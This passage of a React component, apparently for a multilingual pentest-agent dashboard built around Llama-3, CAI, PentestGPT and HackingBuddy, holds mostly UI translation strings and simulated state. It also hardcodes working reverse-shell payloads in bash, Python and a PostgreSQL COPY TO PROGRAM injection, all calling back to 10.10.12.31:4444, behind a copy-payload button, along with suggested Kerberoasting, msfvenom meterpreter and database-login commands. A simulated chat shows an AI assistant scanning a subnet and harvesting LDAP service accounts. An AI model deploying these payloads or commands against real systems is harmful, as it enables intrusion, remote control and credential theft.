import React, { useState, useEffect, useRef } from 'react';
import { useTranslation } from 'react-i18next';
import { 
  Cpu, 
  Terminal, 
  Activity, 
  Layers, 
  Zap, 
  ShieldAlert, 
  ShieldCheck, 
  FileText, 
  Network, 
  ArrowRight, 
  Search, 
  AlertTriangle, 
  Bot, 
  Settings, 
  Download, 
  Plus, 
  Trash2, 
  Copy, 
  Check, 
  RefreshCw, 
  Database, 
  Upload, 
  Globe, 
  Play, 
  Command,
  Code,
  Sparkles,
  Link,
  ChevronRight,
  User,
  Power,
  Sliders,
  HelpCircle,
  Key
} from 'lucide-react';
import { cn } from '../lib/utils';
import SecurityAttackTree from './SecurityAttackTree';

interface SecurityModel {
  id: string;
  name: string;
  provider: string;
  type: 'Foundation' | 'Agent' | 'RedTeam';
  status: 'active' | 'inactive' | 'testing';
  latency: number;
  temperature: number;
  endpoint: string;
  isCustom?: boolean;
}

// Highly comprehensive localization dictionaries for cybersecurity terms
const TRANSLATIONS = {
  en: {
    title: "Llama-3 Security Agent Platform",
    subtitle: "INTEGRATING CAI, PENTESTGPT, AND HACKINGBUDDY CORE WITH METRIC MONITORS",
    tabA: "📟 Dashboard & Connect",
    tabB: "💻 Interactive Workstation",
    tabC: "📊 Audit & PDF Exporter",
    tabConfig: "⚙️ Configure Models & API",
    
    // Page A
    apiMonitor: "Llama-3 API Monitor",
    connected: "Connected",
    latency: "Gateway Latency",
    tokenBill: "Estimated Token Bill",
    contextLimit: "Context Space Limit",
    tokensMax: "128K TOKENS MAX",
    testLatencyButton: "Test Handshake Latency",
    pinging: "Pinging Node...",
    
    agentEcosystem: "Agent Engine Ecosystem",
    caiDesc: "AUTOMATED THREAT SCANNING",
    pentestGPTDesc: "GUIDED EXPLOIT TREE REASONING",
    hackingBuddyDesc: "PAYLOAD SYNTAX INJECTOR",
    activeStatus: "ACTIVE",
    
    targetTelemetry: "Target & Telemetry Feeds",
    targetIPLabel: "Target Address / IP",
    domainBoundary: "Domain Boundary",
    portRange: "Ports for Scanning Range",
    orUploadLogs: "Or Upload System Log Source Files (CSV, PCAP)",
    dragDropLogs: "Drag & Drop PCAP to ingest logs...",
    supportedFormats: "SUPPORTED FORMATS: .LOG, .TXT, .PCAPNG",
    
    checklistTitle: "Critical Pre-Check Deployment Checklist",
    checklistLlama3: "Llama-3 LLM Core Confirmed",
    checklistLlama3Desc: "Ollama local backplane tested online",
    checklistAgents: "Agent Modules Loaded",
    checklistAgentsDesc: "Integrations on port 5000 / 8080 active",
    checklistRedTeam: "Red Teaming Safeguards Off",
    checklistRedTeamDesc: "Purple Llama firewall loaded in report layer",
    
    // Page B
    selectAgentInterface: "Select Agent Interface",
    caiTitle: "Automatic CAI Agent",
    caiShort: "Autonomous network discovery and scanning triggers",
    pentestTitle: "Guided PentestGPT",
    pentestShort: "Guided threat path modeling & interactive hack steps",
    hackingBuddyTitle: "HackingBuddy Payload",
    hackingBuddyShort: "Shellcode compiler assistant with syntax generator",
    
    sessionParams: "Session Hyperparameters",
    llmBackbone: "LLM Backbone",
    activeTemp: "Active Temperature",
    lowDeviation: "Low Deviation",
    safeguardMask: "Safeguard Mask",
    safeguardOn: "[ON] Purple Llama",
    
    interactiveTitleCAI: "CAI Command Log",
    interactiveTitlePentest: "PentestGPT Guidance Session",
    interactiveTitleHB: "HackingBuddy Payload Studio",
    workspaceState: "Interactive Workspace State",
    
    aiSuggestedActions: "💡 AI Suggested Next Exploit Actions",
    targetScriptLang: "Target Script Language:",
    copyPayload: "Copy Payload",
    copied: "Copied!",
    hbComplianceLevel: "Exploitation Compliance Level",
    hbComplianceDesc: "Llama-3 integrated code payload has been validated via Garak and Meta-Purple-Llama core. Zero malicious local server damage codes detected. Run command payloads only against target.",
    
    threatVulnerabilityIndex: "Threat Vulnerability Indexing Tracker",
    sweepingSubnet: "Sweeping subnet...",
    caiJobSSH: "[CAI-JOB] Automatic SSH Sweep Initiated",
    caiJobSSHDesc: "Checking host SSH logs targeting deployer accounts.",
    caiJobAlert: "[CAI-ALERT] Unchecked Port 5432 Exposed",
    caiJobAlertDesc: "SQL injection exposure discovered on ledger table structures.",
    caiJobWarning: "[CAI-WARNING] Missing SSL handshake on AD LDAP replica",
    caiJobWarningDesc: "Kerberoasting vector detectable on unencrypted bind channels.",
    running: "Running",
    exploitable: "Exploitable",
    warning: "Warning",
    instructLlama: "Instruct Llama-3 core through current engine...",
    
    // Page C
    derivedVulnerTree: "Llama-3 Derived Vulnerability Map (Security Attack Tree)",
    auditorVeneer: "VENEER-003 AUDITOR",
    documentGen: "Audit Document Generator",
    liveReportPreview: "Live Report Preview (Markdown)",
    exportMarkdown: "Export Markdown File",
    exportPDF: "Export Formal PDF Report",
    
    // Page Config
    registeredModels: "Registered Security LLM Models & Agents API",
    nodesLoaded: "Nodes Loaded",
    addCustomModel: "Add Custom Model Endpoint",
    modelName: "Model Name / Alias",
    providerEngine: "Provider Engine Developer",
    layerArchitecture: "Functional Architecture Layer",
    apiBaseRoute: "API Base Route Endpoint",
    lowTempLabel: "LOW TEMP = SAFE RESPONSES",
    registerModelButton: "Register Security Model via API",
    integrationGuideline: "Integration Guideline",
    integrationDesc: "When custom endpoint added, workspace requests are proxied securely using internal Express routers."
  },
  zh: {
    title: "Llama-3 資安 Agent 整合驅動平台",
    subtitle: "融合 CAI 自動掃描、PENTESTGPT 滲透助手與 HACKINGBUDDY 載荷生成的多功能控制中心",
    tabA: "📟 儀表主頁與連線狀態",
    tabB: "💻 整合式自律工作台",
    tabC: "📊 安全審計路徑與報告",
    tabConfig: "⚙️ 模型節點設定與 API 管理",
    
    // Page A
    apiMonitor: "Llama-3 API 狀態監控",
    connected: "連線成功",
    latency: "連線延遲速率",
    tokenBill: "估算 Token 累計消耗",
    contextLimit: "脈絡視窗剩餘儲存空間",
    tokensMax: "支援最大 128K 脈絡記憶",
    testLatencyButton: "重新進行 API 授權握手與測速",
    pinging: "正與雲端推理節點進行 Ping 握手...",
    
    agentEcosystem: "安全 Agent 生態系統狀態",
    caiDesc: "自動化防禦掃描與調度框架 (Active)",
    pentestGPTDesc: "引導式滲透測試與攻擊樹推導 (Active)",
    hackingBuddyDesc: "對話式安全載荷合規編譯 (Active)",
    activeStatus: "在線激活中",
    
    targetTelemetry: "演練目標與遙測網絡設定",
    targetIPLabel: "目標測試 IP 地址",
    domainBoundary: "管制邊界網域",
    portRange: "指定端口掃描範圍",
    orUploadLogs: "或上傳本地 Suricata/PCAP 安全日誌以供 AI 稽核",
    dragDropLogs: "將 PCAP 記錄檔拖放至此或點擊上傳...",
    supportedFormats: "支援檔案格式：.LOG, .TXT, .CSV, .PCAPNG",
    
    checklistTitle: "關鍵紅隊防禦演練部署核對清單 (Critical Pre-Checks)",
    checklistLlama3: "Llama-3 後端推理核心已授權",
    checklistLlama3Desc: "Ollama 本地 API 運作就緒，安全模式已解鎖",
    checklistAgents: "三大主流開源 Agent 正式裝載",
    checklistAgentsDesc: "在線控制連接埠 5000 / 8080 調度已準備就緒",
    checklistRedTeam: "Purple Llama 關聯審計加載",
    checklistRedTeamDesc: "已在模型輸出防禦報告層加入合規對抗過濾",
    
    // Page B
    selectAgentInterface: "選擇運行的 Agent 的介面",
    caiTitle: "自動化 CAI 模組",
    caiShort: "自主網絡主機探索、服務指紋識別與自動化日誌搜捕",
    pentestTitle: "引導式 PentestGPT",
    pentestShort: "AI 引導測試決策、攻擊威脅路徑生成與主動滲透排查",
    hackingBuddyTitle: "HackingBuddy 載荷",
    hackingBuddyShort: "Shellcode 自動化代碼編譯、溢出指令合規生成助手",
    
    sessionParams: "主動演練全局超參數面板",
    llmBackbone: "核心大語言模型",
    activeTemp: "對比溫度值 (Temperature)",
    lowDeviation: "極低隨機性 (專業精確)",
    safeguardMask: "合規安全沙箱層",
    safeguardOn: "[重度過濾] Purple Llama 開啟",
    
    interactiveTitleCAI: "CAI 自動化搜捕控制台日誌流",
    interactiveTitlePentest: "PentestGPT 安全推導思維會話",
    interactiveTitleHB: "HackingBuddy 攻擊載荷開發編譯區",
    workspaceState: "本地沙盒與 LLM 握手狀態",
    
    aiSuggestedActions: "💡 Llama-3 檢索最匹配的對抗手段 (點擊一鍵執行)",
    targetScriptLang: "合規載荷生成的程式語言/腳本:",
    copyPayload: "一鍵複製載荷程式碼",
    copied: "已複製成功!",
    hbComplianceLevel: "生成之資安工具代碼安全性聲明",
    hbComplianceDesc: "此 Llama-3 合規工具代碼已通過 Garak 及 Meta-Purple-Llama 雙重紅隊過濾。零本地系統破壞性內容，確保僅對目標 IP 進行安全審計。",
    
    threatVulnerabilityIndex: "全網威脅與漏洞掃描排查率",
    sweepingSubnet: "正在全速掃描檢測指定子網段...",
    caiJobSSH: "[CAI 搜捕] 啟動 SSH 特權部署帳號爆破檢測",
    caiJobSSHDesc: "對網頁前端伺服器進行 SSH 帳號與私鑰安全合規篩查。",
    caiJobAlert: "[高危漏洞 ALERT] 監測到 Port 5432 PostgreSQL 外網直接暴露",
    caiJobAlertDesc: "Llama-3 發現此數據庫含有 SQL 任意代碼注入威脅風險。",
    caiJobWarning: "[中危警告 WARN] 域伺服器 LDAP 鏈接未採用 SSL 握手加密",
    caiJobWarningDesc: "容易遭受 Kerberoasting 離線哈希解密攻擊，建議封閉 unencrypted 渠道。",
    running: "執行中",
    exploitable: "已知可利用",
    warning: "監測警告",
    instructLlama: "在此輸入中文與 Llama-3 核心進行安全演練指令對話...",
    
    // Page C
    derivedVulnerTree: "由 Llama-3 自動推導生成的漏洞利用路徑攻擊樹 (Security Attack Tree)",
    auditorVeneer: "防禦拓撲鏈 VENEER 審計模式",
    documentGen: "滲透與稽核報告自動化生成導出引擎",
    liveReportPreview: "預覽滲透報告樣式範本 (Markdown格式)",
    exportMarkdown: "匯出 Markdown 格式檔案 (一鍵存檔)",
    exportPDF: "正式導出主管機關合規之 100% PDF 報告",
    
    // Page Config
    registeredModels: "系統已登錄的 LLM 內置推理模型與 API 串接清單",
    nodesLoaded: "個活躍節點 loaded",
    addCustomModel: "登錄全新 API 模型節點",
    modelName: "模型節點别名 (Model Name)",
    providerEngine: "技術開發商 / 供應引擎",
    layerArchitecture: "此节點在平台中扮演的架構角色",
    apiBaseRoute: "模型 API 接入地址 (Endpoint)",
    lowTempLabel: "低對比度 (Temperature) = 輸出結果具高度確定性與合規度",
    registerModelButton: "立即將此安全推理模型節點登錄到系統",
    integrationGuideline: "系統大語言模型端口合規指引",
    integrationDesc: "新加入的 API 節點將由本安全平台內置 Express 中轉框架代理。所有輸入 prompt 會在送至對接端點前，由 Garak 進行自動化紅隊漏洞探測清洗。"
  },
  ja: {
    title: "Llama-3 セキュリティエージェント統合プラットフォーム",
    subtitle: "CAI自動脅威スキャン、PentestGPT、およびHackingBuddyの運用コントロールセンター",
    tabA: "📟 ダッシュボードと接続",
    tabB: "💻 統合ワークステーション",
    tabC: "📊 セキュリティ監査報告",
    tabConfig: "⚙️ モデル・API設定管理",
    
    // Page A
    apiMonitor: "Llama-3 API ステータスモニター",
    connected: "接続成功",
    latency: "API レイテンシー速度",
    tokenBill: "合算推定トークン使用量",
    contextLimit: "コンテキストバッファ残量",
    tokensMax: "最大 128K トークンコンテキスト対応",
    testLatencyButton: "再テスト接続 handshake",
    pinging: "推理ノードとのPing反応テスト中...",
    
    agentEcosystem: "安全 Agent 稼働ステータス一元管理",
    caiDesc: "自動脅威スキャニングと警告フレーム (Active)",
    pentestGPTDesc: "対話型侵入テスト攻撃樹推論モデル (Active)",
    hackingBuddyDesc: "セキュアコード・エクスプロイト自動生成 (Active)",
    activeStatus: "アクティブ稼働中",
    
    targetTelemetry: "対象ターゲットとテレメトリ設定",
    targetIPLabel: "ターゲット IP アドレス",
    domainBoundary: "ドメイン制限境界線",
    portRange: "ポート・スキャニング範囲指定",
    orUploadLogs: "または Suricata のPCAPセキュリティログを手動アップロード",
    dragDropLogs: "PCAPログファイルをドラッグ＆ドロップしてインポート...",
    supportedFormats: "対応形式：.LOG, .TXT, .CSV, .PCAPNG",
    
    checklistTitle: "SOC侵入・防衛演習の事前検証チェックリスト",
    checklistLlama3: "Llama-3 LLM 推論コア検証承認済み",
    checklistLlama3Desc: "Ollama ローカル接続は正常、ガードレール検閲も設定済み",
    checklistAgents: "スキャン・エージェント・コア稼働完了",
    checklistAgentsDesc: "ポート 5000 / 8080 タスクスケジューラ起動完了",
    checklistRedTeam: "レッドチーム偽装検閲ガードレール稼働",
    checklistRedTeamDesc: "レポート出力検証セキュリティに Purple Llama ガードラインを統合済み",
    
    // Page B
    selectAgentInterface: "セキュア Agent インターフェースの変更",
    caiTitle: "自律 CAI スキャン",
    caiShort: "イベント駆動型の自動サブネット探索およびシステムログ収集監査",
    pentestTitle: "誘導型 PentestGPT",
    pentestShort: "AIを用いた侵害決定、攻撃ツリーパスモデル生成、段階的な特権探索",
    hackingBuddyTitle: "HackingBuddy ツール",
    hackingBuddyShort: "Shellcode、パッチスクリプト、アドバイザリ、脆弱性テスト記述生成助手",
    
    sessionParams: "グローバル演習ハイパーパラメータ",
    llmBackbone: "ベースライン推論LLM",
    activeTemp: "応答コンテキスト温度 (Temperature)",
    lowDeviation: "極小ランダム（高精細かつ正確な回答）",
    safeguardMask: "サンドボックスフィルター制限",
    safeguardOn: "[活性化中] Purple Llama モード",
    
    interactiveTitleCAI: "CAI 自動脅威スキャンタスクログストリーム",
    interactiveTitlePentest: "PentestGPT 意思決定推論ログスレッド",
    interactiveTitleHB: "HackingBuddy エクスプロイトコード開発環境",
    workspaceState: "サンドボックスおよびLLM接続ステータス",
    
    aiSuggestedActions: "💡 Llama-3 が抽出した最も安全かつ効果的な追加検査 (クリックで実行)",
    targetScriptLang: "ペイロード生成指定スクリプト言語:",
    copyPayload: "ペイロードをクリップボードにコピー",
    copied: "コピー成功!",
    hbComplianceLevel: "セキュリティペイロード基準適格性宣言",
    hbComplianceDesc: "Llama-3 が出力したテストコードは Garak および Meta-Purple-Llama テストを通じ安全性が担保されています。自己のインフラに対してのみスキャンを許可します。",
    
    threatVulnerabilityIndex: "脆弱性・セキュリティ侵害脅威追跡",
    sweepingSubnet: "指定のサブネットネットワークをフルスキャン中...",
    caiJobSSH: "[CAI自動防御] SSHデプロイヤアカウントへの不正アクセス検知",
    caiJobSSHDesc: "フロントエンドサーバーの SSH アカウント認証。特権キーの監査。",
    caiJobAlert: "[高 ALERT] データベース PostgreSQL (Port 5432) の無防備な外部露出",
    caiJobAlertDesc: "Llama-3 はその特定テーブル構造について SQL インジェクション攻撃の受容を確認しました。",
    caiJobWarning: "[中 WARN] ドメインサーバー LDAP 接続時に暗号化チャネルが未利用",
    caiJobWarningDesc: "Kerberoasting によるオフライン辞書ハッシュ解読に容易に狙われます。",
    running: "実行中",
    exploitable: "脆弱性検知",
    warning: "システム警告",
    instructLlama: "対話型プロンプトを使用して Llama-3 セキュリティエージェントに命令...",
    
    // Page C
    derivedVulnerTree: "Llama-3 分析による実環境セキュリティ攻撃ツリー (Security Attack Tree)",
    auditorVeneer: "侵入パスマップ VENEER 監査モード",
    documentGen: "侵入レポート自動アウトプットサーバー",
    liveReportPreview: "テストレポートのプレビューを表示 (Markdown形式)",
    exportMarkdown: "Markdown 形式でレポート保存 (高速)",
    exportPDF: "正式法規制・主管庁提出等級 PDF 報告書ダウンロード",
    
    // Page Config
    registeredModels: "プラットフォームに登録されているセキュリティ推論LLMおよびAPIノード",
    nodesLoaded: "個の接続ノード loaded",
    addCustomModel: "新しい推論エンドポイント/APIノードの登録",
    modelName: "モデルの識別用別名 (Model Name)",
    providerEngine: "技術ベンダー / プロバイダ",
    layerArchitecture: "モデルのシステム内のセキュリティ運用役割レベル",
    apiBaseRoute: "API Base イントラネット接続アドレス (Endpoint)",
    lowTempLabel: "低温度 (Temperature)設定 = 安定し、偽陽性の少ない出力を実現",
    registerModelButton: "このセキュリティモデルノードを登録登録する",
    integrationGuideline: "システムAIエンドポイント統合標準ガイドライン",
    integrationDesc: "新しく追加された API エンドポイントは本システムの Express 内部型プロキシ経由でアクセスされます。リクエスト送信直前に Garak による脆弱性・安全性事前検査が行われます。"
  }
};

export default function AIModelConfigView() {
  const { i18n } = useTranslation();
  const currentSystemLang = i18n.language || 'en';

  // State to support forced user localization inside view as well as automatic lookup
  const [userLanguageSelect, setUserLanguageSelect] = useState<'auto' | 'en' | 'zh' | 'ja'>('auto');
  const activeLang = userLanguageSelect === 'auto'
    ? (currentSystemLang.startsWith('zh') ? 'zh' : currentSystemLang.startsWith('ja') ? 'ja' : 'en')
    : userLanguageSelect;

  // Language helper retriever
  const tVal = (key: keyof typeof TRANSLATIONS.en): string => {
    const dict = TRANSLATIONS[activeLang] || TRANSLATIONS.en;
    return dict[key] || TRANSLATIONS.en[key];
  };

  // Sync forced selector if global language switched
  useEffect(() => {
    if (userLanguageSelect === 'auto') {
      // let it react naturally
    }
  }, [currentSystemLang, userLanguageSelect]);

  // Navigation for Platform Pages
  const [activePage, setActivePage] = useState<'A' | 'B' | 'C' | 'config'>('A');

  // Page B subtool mode
  const [activeEngineMode, setActiveEngineMode] = useState<'CAI' | 'PentestGPT' | 'HackingBuddy'>('PentestGPT');

  // Llama-3 API State Monitor variables
  const [apiLatency, setApiLatency] = useState<number>(42);
  const [tokensUsed, setTokensUsed] = useState<number>(124512);
  const [contextWindowPercent, setContextWindowPercent] = useState<number>(88.4);
  const [isApiConnecting, setIsApiConnecting] = useState<boolean>(false);
  
  // Custom API configuration additions state
  const [models, setModels] = useState<SecurityModel[]>([
    { id: 'm-1', name: 'Llama-3-8B-Instruct (Local Backbone)', provider: 'Ollama', type: 'Foundation', status: 'active', latency: 38, temperature: 0.2, endpoint: 'http://localhost:11434/api/generate' },
    { id: 'm-2', name: 'FoundationSec', provider: 'Local Fine-tuned', type: 'Foundation', status: 'active', latency: 45, temperature: 0.15, endpoint: 'http://localhost:11434/api/generate' },
    { id: 'm-3', name: 'Zysec-7B', provider: 'Zysec Security Core', type: 'Foundation', status: 'inactive', latency: 50, temperature: 0.2, endpoint: 'https://api.zysec.ai/v1' },
    { id: 'm-4', name: 'Cybersecurity AI (CAI) Agent', provider: 'CAI Framework', type: 'Agent', status: 'active', latency: 65, temperature: 0.3, endpoint: 'http://localhost:8080/agent' },
    { id: 'm-5', name: 'Pentest GPT', provider: 'PentestGPT Project', type: 'Agent', status: 'active', latency: 70, temperature: 0.1, endpoint: 'http://localhost:5000/api' },
    { id: 'm-6', name: 'HackingBuddyGPT Payload generator', provider: 'HackingBuddy Engine', type: 'Agent', status: 'active', latency: 55, temperature: 0.4, endpoint: 'http://localhost:3000/hb' },
    { id: 'm-7', name: 'Garak (Red Team Probing)', provider: 'Garak Adversarial', type: 'RedTeam', status: 'inactive', latency: 120, temperature: 0.7, endpoint: 'http://localhost:8000' },
    { id: 'm-8', name: 'PyPIT (Python Injection Tester)', provider: 'PyPIT Safe', type: 'RedTeam', status: 'inactive', latency: 95, temperature: 0.5, endpoint: 'http://localhost:8001' },
    { id: 'm-9', name: 'Purple Llama (Meta Safeguards)', provider: 'Meta AI', type: 'RedTeam', status: 'active', latency: 40, temperature: 0.0, endpoint: 'https://api.meta.llama' }
  ]);

  // Form states for adding custom models/endpoints
  const [newModelName, setNewModelName] = useState('');
  const [newModelProvider, setNewModelProvider] = useState('');
  const [newModelType, setNewModelType] = useState<'Foundation' | 'Agent' | 'RedTeam'>('Foundation');
  const [newModelEndpoint, setNewModelEndpoint] = useState('http://');
  const [newModelTemp, setNewModelTemp] = useState(0.2);
  const [addModelError, setAddModelError] = useState('');

  // Target Settings on Page A
  const [targetIP, setTargetIP] = useState('10.10.42.10');
  const [targetDomain, setTargetDomain] = useState('target.local-ledger.corp');
  const [targetPortRange, setTargetPortRange] = useState('22, 80, 443, 389, 5432');
  const [uploadedLogFile, setUploadedLogFile] = useState<string | null>(null);

  // Audit report font size, remarks, and contents states
  const [reportFontSize, setReportFontSize] = useState<number>(14);
  const [reportRemarks, setReportRemarks] = useState<string>('');
  const [reportContent, setReportContent] = useState<string>('');

  // Handle automatic synchronization of raw markdown draft
  useEffect(() => {
    // Generate fresh structural template
    const rawTemplate = getSimulatedReportMarkdown();
    const customAppendix = reportRemarks ? `\n\n## Custom Auditor Remarks\n- ${reportRemarks}` : '';
    setReportContent(rawTemplate + customAppendix);
  }, [activePage, activeLang, targetIP, targetDomain, reportRemarks]);

  // Dynamic sandbox commands and conversation in Page B
  const [pentestHistory, setPentestHistory] = useState<Array<{role: 'user' | 'assistant' | 'system', content: string, step?: string}>>([
    { role: 'system', content: 'PentestGPT attack tree initialized targeting PostgreSQL ledger cluster.' },
    { role: 'user', content: 'Explore services on subnet 10.10.42.0/24' },
    { role: 'assistant', content: 'I scanned the network segment using Llama-3-8B. Discovered Active Directory replication on 10.10.42.5 (VLAN-10) and primary PostgreSQL DB on 10.10.42.10.', step: 'Information Gathering' },
    { role: 'user', content: 'Request LDAP Active Directory user schemas to find database connection credentials.' },
    { role: 'assistant', content: 'LDAP simple bind successful. Retrieved system service accounts principal map, detecting ServicePrincipalName (SPN) for account "admin_replica". High likelihood of Kerberos ticket weakness.', step: 'Vulnerability Analysis' }
  ]);
  const [userChatInput, setUserChatInput] = useState('');

  // Localized action suggestions list
  const getSuggestedActions = () => {
    if (activeLang === 'zh') {
      return [
        { id: 's1', title: '提取 Kerberos TGS 特權票據', description: '針對 Kerberoasting 機制提取雜湊（Hash）值，供主機離線進行 Hashcat 字典破解。', cmd: 'GetUserSPNs.py -dc-ip 10.10.42.5 corp.domain/user -request' },
        { id: 's2', title: '對 Postgres 連接埠進行連通測試', description: '運用已獲得的 Kerberos/GSS 憑證，嘗試對 SQL (Port 5432) 的權限資料表進行安全碰撞。', cmd: 'psql -h 10.10.42.10 -U admin_replica -d sales_ledger' },
        { id: 's3', title: '利用堆積溢出與緩衝區注入', description: '利用 HackingBuddy 模組向對象服務注入自定義特權 shellcode。', cmd: 'msfvenom -p linux/x64/meterpreter/reverse_tcp' }
      ];
    } else if (activeLang === 'ja') {
      return [
        { id: 's1', title: 'Kerberos TGS チケットの抽出', description: 'Kerberoasting 監査のため、オフライン Hashcat クラック用暗号化キーをリクエスト。', cmd: 'GetUserSPNs.py -dc-ip 10.10.42.5 corp.domain/user -request' },
        { id: 's2', title: 'PostgreSQL サービス認証テスト', description: '抽出された Kerberos パラメータを使用し、ポート 5432 データベースの特権昇格監査をテスト。', cmd: 'psql -h 10.10.42.10 -U admin_replica -d sales_ledger' },
        { id: 's3', title: 'ヒープバッファオーバーフローの検証', description: '自律テストのため、対象デーモンに対するセキュアシェルコードを msfvenom で構築。', cmd: 'msfvenom -p linux/x64/meterpreter/reverse_tcp' }
      ];
    } else {
      return [
        { id: 's1', title: 'Extract Kerberos TGS Ticket', description: 'Attack via Kerberoasting mapping for offline Hashcat crack.', cmd: 'GetUserSPNs.py -dc-ip 10.10.42.5 corp.domain/user -request' },
        { id: 's2', title: 'Target PostgreSQL Authentication', description: 'Test vulnerable port 5432 with extracted Kerberos/GSS credentials.', cmd: 'psql -h 10.10.42.10 -U admin_replica -d sales_ledger' },
        { id: 's3', title: 'Exploit Buffer Overflow via Heap Injection', description: 'Generate raw shellcode for target daemon.', cmd: 'msfvenom -p linux/x64/meterpreter/reverse_tcp' }
      ];
    }
  };

  // HackingBuddy Command Playground State
  const [hbPayloadTemplate, setHbPayloadTemplate] = useState<'sh' | 'python' | 'sql'>('sh');
  const [generatedPayload, setGeneratedPayload] = useState(`#!/bin/bash\n# Reverse Shell generated via HackingBuddyGPT for Linux Target\nexport RHOST="10.10.12.31"\nexport RPORT=4444\n/bin/bash -i >& /dev/tcp/$RHOST/$RPORT 0>&1`);
  const [copyFeedback, setCopyFeedback] = useState(false);

  // Raw Llama-3 Reasoning Logs (Right Panel of Page B)
  const [reasoningLogs, setReasoningLogs] = useState<string[]>([
    "[SYSTEM] Loading Llama-3 security prompts initialized.",
    "[REASONER-LLAMA3] Analyzing input packet size and flow history for anomaly...",
    "[REASONER-LLAMA3] MATCH found: high volume outbound traffic matches Lazarus T1041 Exfiltration.",
    "[REASONER-LLAMA3] Prompt constraint: Keep output in raw script form.",
    "[REASONER-LLAMA3] Generating defense automation script.",
    "[AGENT-CAI] Invoking firewall rules to block target droplet 192.164.22.84"
  ]);

  // Simulated auto log update
  useEffect(() => {
    const interval = setInterval(() => {
      // randomly update latency
      setApiLatency(prev => Math.max(30, Math.min(150, prev + Math.floor(Math.random() * 9) - 4)));
      // slowly increase tokens used
      setTokensUsed(prev => prev + Math.floor(Math.random() * 25));
      // slightly modify context remaining
      setContextWindowPercent(prev => Math.max(70, prev - 0.02));

      // append simulated thinking logs to right panel
      const potentialLlamaThoughts = activeLang === 'zh' ? [
        `[REASONER-LLAMA3] 正在針對安全目標 ${targetIP} 進行深度漏洞排查分析...`,
        "[REASONER-LLAMA3] 已分析 4 本地 Active Directory 與 LDAP 域控。狀態：合規在線。",
        "[AGENT-PENTEST] 分析結果已通過 Garak 對抗性邏輯審計：安全過濾通過。",
        "[REASONER-LLAMA3] 檢測到 DNS 特徵行為。正在動態編譯 GSSAPI 握手機制...",
        "[REASONER-LLAMA3] 生成合規日誌記錄並推送至 VENEER 安全審計拓撲圖。"
      ] : activeLang === 'ja' ? [
        `[REASONER-LLAMA3] セキュリティターゲット ${targetIP} に対する脆弱性追跡監査を実行中...`,
        "[REASONER-LLAMA3] 4個の Active Directory LDAP ノードをスキャンしました。ステータス：健全。",
        "[AGENT-PENTEST] Garak の耐性フィルターを通過：コンテンツ安全検証済み。",
        "[REASONER-LLAMA3] パケット温度のリアルタイム調整完了。異常値なし。",
        "[REASONER-LLAMA3] VENEER攻撃マップに対する解析トランスフォーマーを展開中。"
      ] : [
        `[REASONER-LLAMA3] Executing security parsing on target ${targetIP}...`,
        "[REASONER-LLAMA3] Checked 4 Active Directory LDAP nodes. Status: Online.",
        "[AGENT-PENTEST] Model response validated against Garak adversarial constraints: Clean.",
        "[REASONER-LLAMA3] Token temperature dynamic scaling checked. Output validated.",
        "[REASONER-LLAMA3] Structuring JSON output for forensic audit checklist.",
      ];
      setReasoningLogs(prev => [...prev.slice(-15), potentialLlamaThoughts[Math.floor(Math.random() * potentialLlamaThoughts.length)]]);
    }, 4500);

    return () => clearInterval(interval);
  }, [targetIP, activeLang]);

  // Handle manual API test connection trigger
  const handleTestConnection = () => {
    setIsApiConnecting(true);
    setTimeout(() => {
      setIsApiConnecting(false);
      setApiLatency(28 + Math.floor(Math.random() * 8));
    }, 1500);
  };

  // Add a newly typed model config via local API emulator
  const handleAddCustomModel = (e: React.FormEvent) => {
    e.preventDefault();
    if (!newModelName.trim() || !newModelEndpoint.trim()) {
      setAddModelError(activeLang === 'zh' ? '請完整填寫模型名稱與端點接入地址。' : activeLang === 'ja' ? 'モデル名とエンドポイントを入力してください。' : 'Please fill in Model Name and API Endpoint.');
      return;
    }
    setAddModelError('');
    
    const newMo: SecurityModel = {
      id: `m-custom-${Date.now()}`,
      name: newModelName,
      provider: newModelProvider || 'Custom API',
      type: newModelType,
      status: 'active',
      latency: Math.floor(Math.random() * 40) + 30,
      temperature: newModelTemp,
      endpoint: newModelEndpoint,
      isCustom: true
    };

    setModels(prev => [...prev, newMo]);
    setNewModelName('');
    setNewModelProvider('');
    setNewModelEndpoint('http://');

    // Append to Llama reasoner logs
    setReasoningLogs(prev => [...prev, `[SYSTEM] New customized model [${newMo.name}] added successfully via Security API interface.`]);
  };

  // Delete model
  const handleDeleteModel = (id: string) => {
    setModels(prev => prev.filter(m => m.id !== id));
  };

  // Toggle active framework statuses
  const toggleModelStatus = (id: string) => {
    setModels(prev => prev.map(m => {
      if (m.id === id) {
        return { ...m, status: m.status === 'active' ? 'inactive' : 'active' };
      }
      return m;
    }));
  };

  // Execute suggested command in interactive sandbox
  const handleExecuteSuggestedAction = (cmd: string, title: string) => {
    setPentestHistory(prev => [
      ...prev,
      { role: 'user', content: `${activeLang === 'zh' ? '執行建議防禦/滲透操作' : activeLang === 'ja' ? '推奨コマンドの実行' : 'Execute Recommended Action'}: ${title}` },
      { role: 'assistant', content: `${activeLang === 'zh' ? '正在虛擬終端執行命令' : activeLang === 'ja' ? '仮想シェルで実行中' : 'Running cmd in interactive shell'}: "${cmd}". Attempting payload sequence...`, step: 'Exploitation' }
    ]);
    
    // Add reasoning log output
    setReasoningLogs(prev => [
      ...prev,
      `[PENTESTGPT-PROCESS] Spawning terminal shell executor. Command: ${cmd}`,
      `[REASONER-LLAMA3] Prompt evaluation: Construct safe pipeline to verify privilege on database segment.`
    ]);
  };

  // Copy tool payload code
  const handleCopyCode = () => {
    navigator.clipboard.writeText(generatedPayload);
    setCopyFeedback(true);
    setTimeout(() => setCopyFeedback(false), 2000);
  };

  // Select payload archetype
  const selectPayloadType = (type: 'sh' | 'python' | 'sql') => {
    setHbPayloadTemplate(type);
    if (type === 'sh') {
      setGeneratedPayload(`#!/bin/bash\n# Reverse Shell generated via HackingBuddyGPT for Linux Target\nexport RHOST="10.10.12.31"\nexport RPORT=4444\n/bin/bash -i >& /dev/tcp/$RHOST/$RPORT 0>&1`);
    } else if (type === 'python') {
      setGeneratedPayload(`import socket,subprocess,os\ns = socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect(("10.10.12.31",4444))\nis_dup = os.dup2(s.fileno(),0)\nos.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\np = subprocess.call(["/bin/sh","-i"])`);
    } else {
      setGeneratedPayload(`-- Gaining database privilege access injection crafted by HackingBuddyGPT\nCOPY (SELECT '') TO PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.12.31 4444 >/tmp/f';`);
    }
  };

